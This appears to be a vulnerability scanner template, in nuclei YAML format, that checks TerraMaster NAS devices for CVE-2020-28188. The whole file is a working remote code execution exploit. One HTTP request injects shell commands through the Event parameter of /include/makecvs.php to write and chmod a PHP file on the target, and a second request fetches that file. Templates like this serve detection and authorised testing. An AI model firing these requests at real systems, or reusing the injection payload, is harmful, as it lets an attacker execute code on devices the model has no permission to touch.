id: poc-yaml-terramaster-cve-2020-28188-rce

info:
  name: poc-yaml-terramaster-cve-2020-28188-rce
  author: 1au
  severity: critical
  tags: xray-converted,rce,cve-2020-28188,ct-147577
  reference:
    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202012-1548

http:
  - raw:
      - |
        GET /include/makecvs.php?Event=http|echo%20"<?php%20echo%20md5({{rand_base(8)}});unlink(__FILE__);?>"%20>>%20/usr/www/{{rand_base(8)}}.php%20&&%20chmod%20755%20/usr/www/{{rand_base(8)}}.php|| HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /{{rand_base(8)}}.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200